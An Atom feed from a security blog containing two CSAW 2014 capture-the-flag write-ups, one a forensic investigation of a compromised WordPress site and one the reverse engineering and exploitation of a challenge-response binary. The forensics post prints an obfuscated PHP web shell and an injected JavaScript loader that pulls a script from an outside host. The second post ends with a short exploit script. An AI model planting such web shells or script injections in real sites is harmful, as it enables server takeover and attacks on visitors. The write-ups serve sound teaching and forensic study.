<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Ctf | The Swappage Playground]]></title>
  <link href="http://swappage.github.io/blog/categories/ctf/atom.xml" rel="self"/>
  <link href="http://swappage.github.io/"/>
  <updated>2014-09-28T17:09:33+02:00</updated>
  <id>http://swappage.github.io/</id>
  <author>
    <name><![CDATA[Swappage]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[CSAW 2014: Fluffy No More]]></title>
    <link href="http://swappage.github.io/blog/2014/09/28/csaw-2014-fluffy-no-more/"/>
    <updated>2014-09-28T16:44:18+02:00</updated>
    <id>http://swappage.github.io/blog/2014/09/28/csaw-2014-fluffy-no-more</id>
    <content type="html"><![CDATA[<p>The CSAW CTF 2014 wasn&rsquo;t only exploitation and reverse engineering, within the challenges a whole category was focused on forensics puzzles.</p>

<p>Fluffy No More was a 300 points worth challenge for which the solution could have been achieved by conducting a full scope forensics analysis of a compromised system.</p>

<p>The players were provided with an archive containing</p>

<ul>
<li>a database dump</li>
<li>the content of /var/log</li>
<li>the content of /var/www/html</li>
<li>the content of /etc</li>
</ul>


<p>All the informations were (badly imho) logically acquired from the compromised system, and the challenge was focused mostly on forensics methodology: if the player was good enaugh to understand what happened on the system, he&rsquo;d find the hidden flag.</p>

<!-- more -->


<p>First thing first, let&rsquo;s say that this is how I solved the puzzle, probably there were other easier paths, but I still decided to approach this game like it was a real case, thinking that it was the best way to not leave anything behind.</p>

<p>The fictional scenario involved a compromised wordpress blog, so as a first step, i decided that it was worth to find a clue about how the attacker compromised it.</p>

<p>I had the logs from the web server, but like in any webserver logs, when analyzing them you run through lots of false positives, and this was also the case; reason why I decided to start by looking at the database dump.</p>

<p>To make my life easier, i quickly imported the database and the blog site on a lab machine, and started looking into it:
It was a matter of no time that I could spot a comment to a blog post boasting about the will of compromising the site.</p>

<p><img class="center" src="/images/2014-09-28/comment.png"></p>

<p>I remembered that wordpress, in the comments table, has a field where the IP address of the posting user is saved, I decided to take a look at it, because i thought that it could have been useful in terms of correlations with the apache webserver logs. In most cases this is not gonna happen, you&rsquo;ll unlikely be so lucky, but I was approaching to a CTF problem, not a real world scenario, and so I decided to bet on this.</p>

<pre><code>+------------+----------------+-------------------+
| comment_ID | comment_author | comment_author_IP |
+------------+----------------+-------------------+
|          4 | Hacker         | 192.168.127.130   |
+------------+----------------+-------------------+
</code></pre>

<p>Messing with the logs at this poit was a possibility, but i decided that probably if I had more details on the wordpress installation itself, this would have helped me out more in filtering the log results.</p>

<p>I reset my instance of the blog and logged in as admin to check for the list of installed plugins, and verify if at least one of them was vulnerable.</p>

<p><img class="center" src="/images/2014-09-28/mailpoet.png"></p>

<p>Mail Poet newsletter pulled my attention as it was the only plugin that was alerting that a new version was available, so why not look in public repositories if an exploit for the installed version is available?</p>

<p>I browsed exploit-db and it resulted that a metasploit module to gain remote code execution on this specific wordpress plugin is available.</p>

<p><img class="center" src="/images/2014-09-28/edb.png"></p>

<p>By a quick look at the exploit code, it&rsquo;s possible to figure out that an attacker can upload an arbitrary payload by sending the following POST request</p>

<pre><code class="ruby">    res = send_request_cgi({
      'method'   =&gt; 'POST',
      'uri'      =&gt; uri,
      'ctype'    =&gt; "multipart/form-data; boundary=#{data.bound}",
      'vars_get' =&gt; { 'page' =&gt; 'wysija_campaigns', 'action' =&gt; 'themes' },
      'data'     =&gt; post_data
    })
</code></pre>

<p>and if we look at the apache access log, we could find:</p>

<pre><code>192.168.127.140 - - [16/Sep/2014:20:42:54 +0000] "POST /wp-admin/admin-post.php?page=wysija_campaigns&amp;action=themes HTTP/1.1" 302 385 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
</code></pre>

<p>Ok, now let&rsquo;s see if we can find the uploaded malicious file, according to the exploit code, the call for the payload is done as follows:</p>

<pre><code class="ruby">    payload_uri = normalize_uri(target_uri.path, 'wp-content', 'uploads', 'wysija', 'themes', theme_name, payload_name)
</code></pre>

<p>so by grepping the logs again we could find</p>

<pre><code>192.168.127.140 - - [16/Sep/2014:20:42:54 +0000] "GET /wp-content/uploads/wysija/themes/weblizer/template.php HTTP/1.1" 200 165 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
</code></pre>

<p>Let&rsquo;s give a look at this file, it&rsquo;s most likely gonna be malicious, and infact</p>

<pre><code class="php">    &lt;?php
    $hije = str_replace("ey","","seyteyrey_reyeeypleyaeyceye");
    $andp="JsqGMsq9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYSsqk9PSdoYScgJisqYgsqJsqGMoJ";
    $rhhm="nsqKSwgam9pbihhcnJheV9zbGljZSgkYSwksqYygkYSksqtMykpKSksqpO2VjaG8sqgJsqzwvJy4kay4nPic7fQ==";
    $pvqw="GEpPjMpeyRrPSdja2l0JztlY2hvICc8Jy4kaysq4nPicsq7ZXZhbChsqiYXNlNjRfZGVjb2RlKHByZsqWdfcmVw";
    $wfrm="bGFjZShhcnsqJheSsqgsqnsqL1teXHcsq9XHNdLycsJy9ccy8nKSwgYsqXJyYXksqoJycsJyssq";
    $vyoh = $hije("n", "", "nbnansne64n_ndnecode");
    $bpzy = $hije("z","","zczreaztzez_zfzuznzcztzizon");
    $xhju = $bpzy('', $vyoh($hije("sq", "", $andp.$pvqw.$wfrm.$rhhm))); $xhju();
    ?&gt;
</code></pre>

<p>This is definitely a web shell, and by looking at it, it&rsquo;s most likely a weevely web shell: weevely web shell is evil to investigate, because it doesn&rsquo;t use get or post parameters to send commands, but as opposite it uses cookies, which are not logged in the webserver logs.</p>

<p>So from now on, understanding what happened was a real deal.</p>

<p>The attacker managed to obtain remote code execution on the server, but what would an attacker do from there on?</p>

<p>It&rsquo;s fair to assume that he might have tried to maintain access on the server, and potentially to install backdoors or spread malwares using the site; I was at a dead end tho, I couldn&rsquo;t follow a logical step forward anymore, so what i was left to do was to look at the logs with a greedy approach to see if i could find something interesting.</p>

<p>And it was while i was looking at /var/log/auth.log that I noticed a bunch of weird sudo activities by the ubuntu user using sudo.</p>

<pre><code>Sep 17 19:18:45 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/bin/chgrp -R www-data /var/www/
Sep 17 19:18:45 ubuntu sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)
Sep 17 19:18:45 ubuntu sudo: pam_unix(sudo:session): session closed for user root
Sep 17 19:18:53 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/bin/chmod -R 775 /var/www/
Sep 17 19:18:53 ubuntu sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)
Sep 17 19:18:53 ubuntu sudo: pam_unix(sudo:session): session closed for user root
Sep 17 19:20:09 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
Sep 17 19:20:09 ubuntu sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)
Sep 17 19:20:22 ubuntu sudo: pam_unix(sudo:session): session closed for user root
Sep 17 19:20:55 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/find /var/www/html/ * touch {}
</code></pre>

<p>what was going on here? why would the administrator tamper timestamps that badly? and most importantly, what was that vi on /var/www/html/wp-content/themes/twentythirteen/js/html5.js ?</p>

<p>Giving a quick look at that file revealed something extremely suspicious: the file looked like an obfuscated javascript:</p>

<pre><code class="javascript">    (function(l, f) {
        function m() {
            var a = e.elements;
            return "string" == typeof a ? a.split(" ") : a
        }

        function i(a) {
            var b = n[a[o]];
            b || (b = {}, h++, a[o] = h, n[h] = b);
            return b
        }

        function p(a, b, c) {
            b || (b = f);
            if (g) return b.createElement(a);
            c || (c = i(b));
            b = c.cache[a] ? c.cache[a].cloneNode() : r.test(a) ? (c.cache[a] = c.createElem(a)).cloneNode() : c.createElem(a);
            return b.canHaveChildren &amp;&amp; !s.test(a) ? c.frag.appendChild(b) : b
        }

        function t(a, b) {
            if (!b.cache) b.cache = {}, b.createElem = a.createElement, b.createFrag = a.createDocumentFragment, b.frag = b.createFrag();
            a.createElement = function(c) {
                return !e.shivMethods ? b.createElem(c) : p(c, a, b)
            };
            a.createDocumentFragment = Function("h,f", "return function(){var n=f.cloneNode(),c=n.createElement;h.shivMethods&amp;&amp;(" + m().join().replace(/[\w\-]+/g, function(a) {
                b.createElem(a);
                b.frag.createElement(a);
                return 'c("' + a + '")'
            }) + ");return n}")(e, b.frag)
        }

        function q(a) {
            a || (a = f);
            var b = i(a);
            if (e.shivCSS &amp;&amp; !j &amp;&amp; !b.hasCSS) {
                var c, d = a;
                c = d.createElement("p");
                d = d.getElementsByTagName("head")[0] || d.documentElement;
                c.innerHTML = "x&lt;style&gt;article,aside,dialog,figcaption,figure,footer,header,hgroup,main,nav,section{display:block}mark{background:#FF0;color:#000}template{display:none}&lt;/style&gt;";
                c = d.insertBefore(c.lastChild, d.firstChild);
                b.hasCSS = !!c
            }
            g || t(a, b);
            return a
        }
        var k = l.html5 || {},
            s = /^&lt;|^(?:button|map|select|textarea|object|iframe|option|optgroup)$/i,
            r = /^(?:a|b|code|div|fieldset|h1|h2|h3|h4|h5|h6|i|label|li|ol|p|q|span|strong|style|table|tbody|td|th|tr|ul)$/i,
            j, o = "_html5shiv",
            h = 0,
            n = {},
            g;
        (function() {
            try {
                var a = f.createElement("a");
                a.innerHTML = "&lt;xyz&gt;&lt;/xyz&gt;";
                j = "hidden" in a;
                var b;
                if (!(b = 1 == a.childNodes.length)) {
                    f.createElement("a");
                    var c = f.createDocumentFragment();
                    b = "undefined" == typeof c.cloneNode ||
                        "undefined" == typeof c.createDocumentFragment || "undefined" == typeof c.createElement
                }
                g = b
            } catch (d) {
                g = j = !0
            }
        })();
        var e = {
            elements: k.elements || "abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video",
            version: "3.7.0",
            shivCSS: !1 !== k.shivCSS,
            supportsUnknownElements: g,
            shivMethods: !1 !== k.shivMethods,
            type: "default",
            shivDocument: q,
            createElement: p,
            createDocumentFragment: function(a, b) {
                a || (a = f);
                if (g) return a.createDocumentFragment();
                for (var b = b || i(a), c = b.frag.cloneNode(), d = 0, e = m(), h = e.length; d &lt; h; d++) c.createElement(e[d]);
                return c
            }
        };
        l.html5 = e;
        q(f)
    })(this, document);
    var g = "ti";
    var c = "HTML Tags";
    var f = ". li colgroup br src datalist script option .";
    f = f.split(" ");
    c = "";
    k = "/";
    m = f[6];
    for (var i = 0; i &lt; f.length; i++) {
        c += f[i].length.toString();
    }
    v = f[0];
    x = "\'ht";
    b = f[4];
    f = 2541 * 6 - 35 + 46 + 12 - 15269;
    c += f.toString();
    f = (56 + 31 + 68 * 65 + 41 - 548) / 4000 - 1;
    c += f.toString();
    f = "";
    c = c.split("");
    var w = 0;
    u = "s";
    for (var i = 0; i &lt; c.length; i++) {
        if (((i == 3 || i == 6) &amp;&amp; w != 2) || ((i == 8) &amp;&amp; w == 2)) {
            f += String.fromCharCode(46);
            w++;
        }
        f += c[i];
    }
    i = k + "anal";
    document.write("&lt;" + m + " " + b + "=" + x + "tp:" + k + k + f + i + "y" + g + "c" + u + v + "j" + u + "\'&gt;\&lt;/" + m + "\&gt;");
</code></pre>

<p>The purpose of this javascript was to redirect the user to the following URL</p>

<pre><code>http://128.238.66.100/announcement.pdf
</code></pre>

<p>upon execution.</p>

<p>The PDF, when opened into a viewer looked as follow:</p>

<p><img class="center" src="/images/2014-09-28/pdf.png"></p>

<p>and at a first look it looked just like an image of a wizard with text on it.</p>

<p>But it for sure was hiding something, the usage of PDF with attached malicious content is very common in waterfall attacks, so why not giving it a closer look with PDF analysis tools like peepdf?</p>

<pre><code># peepdf -i announcement.pdf 
Warning: Spidermonkey is not installed!!
Warning: pylibemu is not installed!!

File: announcement.pdf
MD5: 02794f436a5bb6100e2fe67714cf5933
SHA1: 322e70a561aeee3833145d7f0942c8e32fe24241
Size: 390303 bytes
Version: 1.4
Binary: True
Linearized: False
Encrypted: False
Updates: 0
Objects: 9
Streams: 4
Comments: 0
Errors: 0

Version 0:
    Catalog: 6
    Info: 7
    Objects (9): [1, 2, 3, 4, 5, 6, 7, 8, 9]
    Streams (4): [1, 2, 3, 8]
        Encoded (4): [1, 2, 3, 8]
    Suspicious elements:
        /Names: [6]
        /EmbeddedFiles: [6]
        /EmbeddedFile: [8]
</code></pre>

<p>Wow, so many objects,  it was really worth looking at it one by one more closely, because infact in the 8th one we could spot:</p>

<pre><code>PPDF&gt; object 8

&lt;&lt; /Length 212
/Type /EmbeddedFile
/Filter /FlateDecode
/Params &lt;&lt; /Size 495
/Subtype /application/pdf &gt;&gt;
stream
var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
endstream
</code></pre>

<p>The hex encoded text looked promising&hellip;</p>

<pre><code># python
Python 2.7.3 (default, Mar 14 2014, 11:57:14) 
[GCC 4.7.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; print "\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"
YOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy}
&gt;&gt;&gt;
</code></pre>

<p>So, finally, here was the flag!</p>

<pre><code>key{Those Fluffy Bunnies Make Tummy Bumpy}
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CSAW 2014: Saturn Walkthrough]]></title>
    <link href="http://swappage.github.io/blog/2014/09/24/csaw-2014-saturn-walkthrough/"/>
    <updated>2014-09-24T21:20:47+02:00</updated>
    <id>http://swappage.github.io/blog/2014/09/24/csaw-2014-saturn-walkthrough</id>
    <content type="html"><![CDATA[<h2>Starring</h2>

<ul>
<li>Superkojiman as <em>My brain runs assembly code</em></li>
<li>Barrebas as <em>The silent disassembler ninja</em></li>
<li>Swappage as <em>The mumbler and random guesser</em></li>
</ul>


<p>Hello hello, Swappage here writing on behalf of the whole group that worked on this exploit dev :) please don&rsquo;t kill me as my English is really terrible, although it might also be Koji and Bas&#8217; fault for not reviewing this doc properly before publishing :p</p>

<p>During the past weekend me and a bunch of dudes from <a href="www.vulnhub.com">VulnHub</a> decided to test ourselves and play the CSAW 2014 CTF challenge. Along wight he 300 point Forensics challenge, Saturn at exploitation 400 was one of the more interesting ones to solve. This is our writeup on it.</p>

<!-- more -->


<p>the question from the challenge stated:</p>

<p><em>You have stolen the checking program for the CSAW Challenge-Response-Authentication-Protocol system. Unfortunately you forgot to grab the challenge-response keygen algorithm (libchallengeresponse.so). Can you still manage to bypass the secure system and read the flag?</em></p>

<p>So basically our objective was to find a way to bypass the challenge-response handshake authentication process handled by this binary to read the flag; it was also obvious that we were missing a component, which was supposed to handle the task of generating the challenge response, and that we needed to live with it.</p>

<h2>Getting the binary to run</h2>

<p>A quick check against the binary using ldd confirmed that we actually were missing a module which was needed for the application to run; relying simply on static analysis might be <strong>extremely</strong> frustrating and unproductive, so our first step was to make sure we could execute the binary locally to also perform dynamic analysis.
We came up with the following code snippet that we compiled as shared library:</p>

<p>Here is the .c snipplet</p>

<pre><code class="c">    #include &lt;stdio.h&gt;
    #include &lt;stdlib.h&gt;

    int fillChallengeResponse() {
        return 0;
    }
</code></pre>

<p>and the .h</p>

<pre><code class="c">    int fillChallengeResponse();
</code></pre>

<p>They were nothing but a dummy function but it was enough to be able to run the binary without it terminating.</p>

<h2>The application structure</h2>

<p>By doing some static analysis we determined that saturn was made of three main parts:</p>

<ul>
<li>one responsible for providing the client a challenge</li>
<li>one responsible for checking the response sent by the client to the server</li>
<li>and the last one that would print out the flag if the response from the client was correct.</li>
</ul>


<p>The access to these 3 branches was handled by something similar to a case switch, where the layout of the buffer sent by the client was verified for a sequence of commands as follows:</p>

<ul>
<li>if the first byte was in the range of 0xa0 to 0xaf the execution flow would get into the function responsible for providing the challenge to the client</li>
<li>if the first byte was in the range of 0xe0 to 0xef the execution flow would get into the function responsible for checking the response</li>
<li>if the first byte was a 0x80, the execution flow would get into the function responsible for printing the flag to stdout.</li>
</ul>


<p><img class="center" src="/images/2014-09-24/caseswitch.png"></p>

<p>At this point we knew that intended way to interact with the binary was to</p>

<ul>
<li>send the command sequence to request a challenge</li>
<li>send the response</li>
<li>send the command to receive the flag</li>
</ul>


<h2>THe genChallenge() function</h2>

<p>Yes, i named it this way, in fact the binary was stripped, so while debugging using IDA i decided to rename it for making things easier :D
By the way&hellip;
The second step was to closely verify how the function responsible for providing the challenge to the client actually worked</p>

<pre><code class="c-objdump">    .text:0804885C                 push    ebp
    .text:0804885D                 mov     ebp, esp
    .text:0804885F                 push    ebx
    .text:08048860                 sub     esp, 34h
    .text:08048863                 mov     eax, [ebp+arg_0]
    .text:08048866                 mov     [ebp+var_1C], al
    .text:08048869                 movzx   eax, [ebp+var_1C]
    .text:0804886D                 and     eax, 0Fh         ; &lt;=====
    .text:08048870                 mov     [ebp+var_11], al
    .text:08048873                 mov     eax, off_804A050     ; &lt;=====
    ...
    .text:080488B9                 mov     [esp+10h], ebx
    .text:080488BD                 mov     [esp+0Ch], ecx
    .text:080488C1                 mov     [esp+8], edx
    .text:080488C5                 mov     [esp+4], eax
    .text:080488C9                 mov     dword ptr [esp], offset format ; "%c%c%c%c"
    .text:080488D0                 call    _printf
    .text:080488D5                 mov     eax, ds:stdout
    .text:080488DA                 mov     [esp], eax      ; stream
    .text:080488DD                 call    _fflush
    .text:080488E2                 add     esp, 34h
    .text:080488E5                 pop     ebx
    .text:080488E6                 pop     ebp
</code></pre>

<p>We figured out that the challenge was read and returned to the client from a memory location controlled by the second digit of the byte, which meant that if we sent \xa0 we received 4 bytes, while if we were sending \xa1 we were receiving 4 other bytes.
This Part required a lot of testing and analysis by <em>talking</em> also to the real server, in fact we didn&rsquo;t have the library that would generate the challenge/response, and therefore these memory locations were all 0.</p>

<p>After a couple of trial and error, and thanks to superkojiman&rsquo;s smartness, we figured out that we could send a sequence of commands and read up to a total of 32 bytes of memory, by sending \xa0\xa1\xa2&hellip; and so on. (more on this later, as this is really important).</p>

<p>At this point we thought then, that the challenge, wasn&rsquo;t composed of 4 bytes, but probably by 32.</p>

<h2>The checkResponse() function</h2>

<p>The check response function was the one responsible for actually verifying the validity of the response provided by the client.</p>

<p>To access this branch of code the client had to send the proper command, in the range of 0xe0 to 0xef followed by a sequence of 4 bytes representing (part) of the response.</p>

<pre><code class="c-objdump">    .text:080488E8                 push    ebp
    .text:080488E9                 mov     ebp, esp
    .text:080488EB                 sub     esp, 28h
    .text:080488EE                 mov     eax, [ebp+arg_0]
    .text:080488F1                 mov     [ebp+var_1C], al
    .text:080488F4                 movzx   eax, [ebp+var_1C]
    .text:080488F8                 and     eax, 0Fh
    .text:080488FB                 mov     [ebp+var_15], al
    .text:080488FE                 mov     eax, off_804A054     ; &lt;== the memory location from which the response is read
    .text:08048903                 movzx   edx, [ebp+var_15]
    .text:08048907                 shl     edx, 2
    .text:0804890A                 add     eax, edx
    .text:0804890C                 mov     eax, [eax]
    .text:0804890E                 mov     [ebp+var_10], eax
    .text:08048911                 mov     dword ptr [esp+8], 4 ; nbytes
    .text:08048919                 lea     eax, [ebp+buf]
    .text:0804891C                 mov     [esp+4], eax    ; buf
    .text:08048920                 mov     dword ptr [esp], 0 ; fd
    .text:08048927                 call    _read
    .text:0804892C                 mov     eax, [ebp+buf]
    .text:0804892F                 mov     [ebp+var_C], eax
    .text:08048932                 mov     eax, [ebp+var_C]
    .text:08048935                 cmp     eax, [ebp+var_10]
    .text:08048938                 jz      short loc_8048946
    .text:0804893A                 mov     dword ptr [esp], 0 ; status
    .text:08048941                 call    _exit
    .text:08048946
    .text:08048946 loc_8048946:
    .text:08048946                 movzx   eax, [ebp+var_15]
    .text:0804894A                 mov     ds:dword_804A0A0[eax*4], 1   ; &lt;== if bytes are correct this memory location is set to 1
    .text:08048955                 leave
    .text:08048956                 retn
</code></pre>

<p>Again, we missed the library responsible for generating the challenge response, so everything was 0 to us yet we could figure out that</p>

<ul>
<li>if the bytes were correct the memory location at address <em>dword_804A0A0[eax</em>4]* was set to 1</li>
<li>if the bytes were wrong exit() was called instead causing the application to terminate.</li>
</ul>


<p>At this point that was all we knew, as we were still missing an important part of the puzzle, which comes into play when the function that is supposed to finally open and read the flag for us is called.</p>

<h2>A matter of cycling</h2>

<p>We thought we were really close to solving the puzzle, but we were obviously proved wrong.</p>

<p>If we take a look at the graph of the function responsible of opening the flag.txt file and then writing it to stdout, we can notice that there is a funny and evil function which i decided to name Cycles()</p>

<p><img class="center" src="/images/2014-09-24/openfile.png"></p>

<p>Apparantly it looks like that depending on the return value of that function, we would or wouldn&rsquo;t be able to read the flag.</p>

<p>Let&rsquo;s give a quick look at the function</p>

<p><img class="center" src="/images/2014-09-24/cycles.png"></p>

<p>The concept is as simple as this:</p>

<ul>
<li>the function cycles 8 times using the address pointed by ebp+var_4 as counter</li>
<li>at first it zeroes out EAX</li>
<li>then it moves the value from the memory location at address dword_804A0A0[eax*4 into EAX</li>
<li>and it multiplies EAX by EBP+var_8 (which is always 1)</li>
<li>at the end of the 8 iterations it returns the value in EAX</li>
</ul>


<p>So, considering that to get to read the flag, the only way to do that was for this function to return 1, that meant that EAX had to be 1 after the 8 cycles ended
At this point the only way, was to have dword_804A0A0[eax*4 to contain 1.</p>

<p>But wait, where did i see this address before? it looks familiar&hellip;</p>

<p>If we get back to the function that checks the response (the one accessed by sending \xeN) we notice that the memory location is exactly the same</p>

<pre><code class="c-objdump">    .text:08048946                 movzx   eax, [ebp+var_15]
    .text:0804894A                 mov     ds:dword_804A0A0[eax*4], 1   ; &lt;== if bytes are correct this memory location is set to 1
    .text:08048955                 leave
    .text:08048956                 retn
</code></pre>

<pre><code class="c-objdump">    .text:08048803                 mov     eax, [ebp+var_4]
    .text:08048806                 mov     eax, ds:dword_804A0A0[eax*4] ; &lt;== if this is 1, eax is 1
    .text:0804880D                 mov     edx, [ebp+var_8]
    .text:08048810                 imul    eax, edx
</code></pre>

<p>In the end, the purpose of this function then, was to perform a further check and see if the <strong>whole</strong> response was correct.. wait, what? the WHOLE? (more on this later)</p>

<h2>How we saw the light at the end of the tunnel</h2>

<p>At this point everything was starting to make sense, but we were missing a point..
then all of a sudden we began to mumble about those 8 iterations</p>

<p><em>8 iterations.. 8 iterations&hellip; but what if?&hellip;</em></p>

<p>And that&rsquo;s how a simple guessing can lead to the solution, what if we needed to send 8 chunks of 4 bytes and build a whole response?
we thought, then that bitwise AND would make sense, we were able to get a total of 32 bytes of challenge from the server, maybe it&rsquo;s expecting us to send it 32 bytes, in chunk of 4.</p>

<p>we quickly tried that out by building a buffer that would at first pull 32 bytes of challenge 4 bytes at a time</p>

<pre><code>\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7
</code></pre>

<p>and then send the response with</p>

<pre><code>"\xe0" + &lt;the four bytes received from \xa0&gt; + "\xe1" + &lt;the 4 bytes received from \xa1&gt;.....*
</code></pre>

<p>and punched it to the server.. DAMN, no luck, it didn&rsquo;t work!
yet we were so close..</p>

<p>Then at a certain point, Barrebas, who was sitting silent working on reversing the binary said&hellip;</p>

<p><em>&ldquo;Wait.. the response is checked starting at a memory location that is 32 bytes away from where the challenge is read from&rdquo;</em></p>

<p>We saw the light! :D
we remembered that we could send commands from \xa0 to \xaf, which probably meant we could read past the 32 bytes of the challenge&hellip; what if we tried to verify with \xe0 the output from \xa8, and all the way onward to \xe7 with \xaf?</p>

<p>That would have probably sent the expected response to the server for each challenge request.. we tried and..
BAM! we got the flag!</p>

<pre><code># ./updated.py
CSAW ChallengeResponseAuthenticationProtocol Flag Storage

flag{greetings_to_pure_digital}
</code></pre>

<p>Here is the script we used as exploit to retrieve the flag from the server</p>

<pre><code class="python">    #!/usr/bin/env python

    from socket import *
    import sys, struct
    import time

    target = "54.85.89.65"
    #target = "127.0.0.1"

    s = socket(AF_INET, SOCK_STREAM)
    s.connect((target, 8888))

    print s.recv(1024)  # banner 

    s.send("\xa8\xa9\xaa\xab\xac\xad\xae\xaf")
    c0 = s.recv(4)        # challenge 0 
    c1 = s.recv(4)        # challenge 1 
    c2 = s.recv(4)        # challenge 2 
    c3 = s.recv(4)        # challenge 3 
    c4 = s.recv(4)        # challenge 4 
    c5 = s.recv(4)        # challenge 5 
    c6 = s.recv(4)        # challenge 6 
    c7 = s.recv(4)        # challenge 7 

    challenge = c0 + c1 + c2 + c3 + c4 + c5 + c6 + c7

    buf = (
    "\xe0" + c0 + 
    "\xe1" + c1 + 
    "\xe2" + c2 + 
    "\xe3" + c3 + 
    "\xe4" + c4 + 
    "\xe5" + c5 + 
    "\xe6" + c6 + 
    "\xe7" + c7 + 
    "\x80"
    )
    s.send(buf)
    print s.recv(1024)
</code></pre>
]]></content>
  </entry>
  
</feed>
